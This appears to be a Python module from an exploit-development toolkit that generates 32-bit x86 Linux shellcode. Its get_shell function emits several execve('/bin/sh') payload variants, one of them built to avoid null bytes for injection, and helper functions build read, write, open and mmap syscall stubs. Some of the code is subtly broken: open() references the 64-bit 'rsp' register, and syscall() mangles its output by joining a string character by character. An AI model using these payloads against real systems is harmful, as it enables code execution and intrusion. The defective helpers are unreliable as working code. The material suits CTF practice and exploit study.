#!/usr/bin/env python

from pwnkit.osys.linux.mem import bytes2mem
from pwnlib.constants.linux import i386 as constants

""" 32 bits shellcode """


def write_bytes(text, target):
    code = []

    code.append(f"mov eax, {target}")
    for v in bytes2mem(text, 32, "little")[::-1]:
        code.append(f"mov ebx, {hex(v)}")
        code.append("mov [eax], ebx")
        code.append("add eax, 4")

    return "\n".join(code)


def write_to_stack(text: bytes):
    code = []

    for v in bytes2mem(text, 32, "little")[::-1]:
        code.append(f"mov eax, {hex(v)}")
        code.append("push eax")

    return "\n".join(code)


def get_shell(code_type="standard"):
    if code_type == "standard":
        code = ["xor    ecx, ecx",
                "xor    edx, edx",
                "push   edx",
                "push   0x68732f2f",
                "push   0x6e69622f",
                "mov    ebx, esp",
                "xor    eax, eax",
                "mov    al, 0xb",
                "int 0x80"]

    elif code_type == "minimum":
        code = ["xor    ecx, ecx",
                "mul    ecx",
                "mov    al, 0xb",
                "push   0x68732f",
                "push   0x6e69622f",
                "mov    ebx, esp",
                "int 0x80"]

    elif code_type == "without 00":
        code = ["xor    ecx, ecx",
                "mul    ecx",
                "push   eax",
                "mov    al, 0xb",
                "push   0x68732f2f",
                "push   0x6e69622f",
                "mov    ebx, esp",
                "int 0x80"]

    return "\n".join(code)


""" 32 bits syscall """


def read(fd, buf, count):
    """ ssize_t read(int fd, void *buf, size_t count); """

    code = [
        f"mov ebx, {fd}",
        f"mov ecx, {buf}",
        f"mov edx, {count}",
        f"mov eax, {int(constants.__NR_read)}",  # eax = 3
        "int 0x80"
    ]

    return "\n".join(code)


def write(fd, buf, count):
    """ ssize_t write(int fd, void *buf, size_t count); """

    code = [
        f"mov ebx, {fd}",
        f"mov ecx, {buf}",
        f"mov edx, {count}",
        f"mov eax, {int(constants.__NR_write)}",  # eax = 4
        "int 0x80"
    ]

    return "\n".join(code)


def open(pathname, flags, mode=0):
    """ int open(const char *pathname, int flags, mode_t mode); """

    code = []

    if isinstance(pathname, bytes):
        if not pathname.endswith(b"\x00"):
            pathname += b"\x00"
        code.append(write_to_stack(pathname))
        pathname = "rsp"

    code += [
        f"mov ebx, {pathname}",
        f"mov ecx, {flags}",
        f"mov edx, {mode}",
        f"mov eax, {int(constants.__NR_open)}",  # eax = 5
        "int 0x80"
    ]

    return "\n".join(code)


def mmap(start, length, prot, flags, fd, offsize):
    """ void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offsize); """

    code = [
        f"mov ebx, {start}",
        f"mov ecx, {length}",
        f"mov edx, {prot}",
        f"mov esi, {flags}",
        f"mov edi, {fd}",
        f"mov ebp, {offsize}",
        f"mov eax, {int(constants.__NR_mmap)}",  # eax = 90
        "int 0x80"
    ]

    return "\n".join(code)


def mmap2(start, length, prot, flags, fd, offsize):
    """ void *mmap2(void *start, size_t length, int prot, int flags, int fd, off_t offsize); """

    code = [
        f"mov ebx, {start}",
        f"mov ecx, {length}",
        f"mov edx, {prot}",
        f"mov esi, {flags}",
        f"mov edi, {fd}",
        f"mov ebp, {offsize}",
        f"mov eax, {int(constants.__NR_mmap2)}",  # eax = 192
        "int 0x80"
    ]

    return "\n".join(code)


def syscall(syscall_name, a1=None, a2=None, a3=None, a4=None, a5=None, a6=None):
    nr = getattr(constants, f"__NR_{syscall_name}")

    code = ""
    if a1:
        code += f"mov ebx, {a1}\n"
    if a2:
        code += f"mov ecx, {a2}\n"
    if a3:
        code += f"mov edx, {a3}\n"
    if a4:
        code += f"mov esi, {a4}\n"
    if a5:
        code += f"mov edi, {a5}\n"
    if a6:
        code += f"mov ebp, {a6}\n"
    code += f"mov eax, {int(nr)}\n"
    code += "int 0x80"

    return "\n".join(code)
